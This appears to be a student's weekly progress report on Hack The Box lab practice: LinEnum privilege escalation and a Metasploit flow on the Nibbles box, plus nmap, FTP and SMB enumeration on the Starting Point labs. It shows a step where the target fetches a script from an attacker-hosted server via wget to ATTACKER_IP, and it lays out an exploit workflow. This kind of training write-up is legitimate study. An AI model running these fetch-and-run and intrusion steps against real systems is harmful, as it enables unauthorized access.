# 🗓️ Week 11 Progress Report

---

This week I finished the final Nibbles chapters and practiced post-exploitation on several HTB labs. Reinstalling the VM earlier paid off — I got to run full end-to-end flows and practice escalation & post-exploit techniques.

---

## 🔐 Nibbles — Privilege Escalation & Alternate User Method

### Privilege Escalation (LinEnum)
- Performed the **initial foothold** and then moved to PrivEsc using `LinEnum.sh`.
- Typical workflow I used:
  1. Host a script from my attacking machine:
     ```bash
     # on attacker
     python3 -m http.server 8000
     ```
  2. On the target, download the script with `wget`:
     ```bash
     wget http://ATTACKER_IP:8000/LinEnum.sh
     ```
  3. Make it executable and run:
     ```bash
     chmod +x LinEnum.sh
     ./LinEnum.sh
     ```
  4. Review LinEnum output for SUID binaries, sudoers misconfigs, cron jobs, and other PrivEsc vectors — and then test the appropriate vector to get root.

> Outcome: Able to escalate to **root** on the Nibbles box after finding a suitable vector identified by LinEnum outputs.

### Alternate User Method (Metasploit)
- Used Metasploit on the attacker machine to try an **alternate-user / exploit flow**:
  1. Start Metasploit:
     ```bash
     msfconsole
     ```
  2. Select an exploit/module and set options:
     ```text
     use exploit/....
     set RHOST target.ip
     set LHOST attacker.ip
     show options
     set PAYLOAD <payload/name>
     exploit
     ```
- `show options` helped identify other required fields (RPORT, LHOST, LPORT, etc.). After setting payload & options, ran `exploit` to get a session or elevate privileges where possible.

---

## 🛠 Post-Exploitation Practice — HTB Starting Point Labs

I practiced on retired/Starting Point boxes: **Meo**, **Fawn**, and **Dancing**. These labs reinforced basic enumeration → access → flag capture workflows.

### Common steps I ran
- **Port scanning & service enumeration**
  ```bash
  nmap -sS -sV -p- target.ip
````

* **FTP**

  ```bash
  ftp target.ip
  # or
  nc target.ip 21
  ```

  * Logged in (anonymous or found creds), navigated directories, and used `get` to download files/flags.

* **SMB**

  ```bash
  smbclient -L //target.ip -U username
  smbclient //target.ip/share -U username
  ```

  * Enumerated shares, downloaded interesting files, and checked for credentials/configs.

* **Flag capture**

  * Looked for `user.txt` / `root.txt` or files containing flags in webroot, home directories, or share folders.

### Lessons learned

* Practicing multiple labs in a row builds speed and pattern recognition (common misconfigurations, weak creds, default services).
* Automations + manual checks: use scripts (LinEnum, etc.) for speed, then manual confirmation to avoid false positives.

---

## ✅ Reflection & Next Steps

* **What went well:** Completed Nibbles PrivEsc & Alternate-User modules; escalated to root via LinEnum output; practiced hands-on post-exploit steps across multiple labs.
* **Challenges:** Interpreting LinEnum output quickly and selecting the safest escalation vector (some kernel/SUID exploits require extra caution).
* **Next week plan:**

  * Start **Common Pitfalls** module on HTB Academy (learn common mistakes and mitigation)
  * Continue more retired lab practice (focus: post-exploitation cleanup, persistence concepts in lab-safe ways)
  * Begin capturing step-by-step writeups (commands, screenshots, lessons) for 2 of these boxes and push writeups to GitHub.

> *Quote for the week:* “You learn more from doing badly at something and improving than not doing it at all.” — keep grinding.

---
